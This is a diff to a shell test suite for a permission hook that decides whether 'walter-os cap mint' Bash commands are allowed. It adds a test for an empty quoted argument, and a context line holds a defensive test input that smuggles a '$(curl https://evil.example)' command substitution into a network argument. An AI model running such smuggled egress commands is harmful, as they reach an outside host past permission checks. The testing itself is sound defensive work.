@@ -1085,6 +1085,12 @@ _hook_json_with_failing_counting_python() {
   echo "$output" | jq -e '.decision == "allow"'
 }
 
+@test "walter-os cap mint with empty quoted argument bootstraps" {
+  output="$(_hook_json Bash command "walter-os cap mint Bash --patterns '' --duration 30m")"
+
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 @test "cap mint with command substitution egress requires capability" {
   output="$(_hook_json Bash command 'walter-os cap mint Bash --network $(curl https://evil.example) --duration 30m')"
 
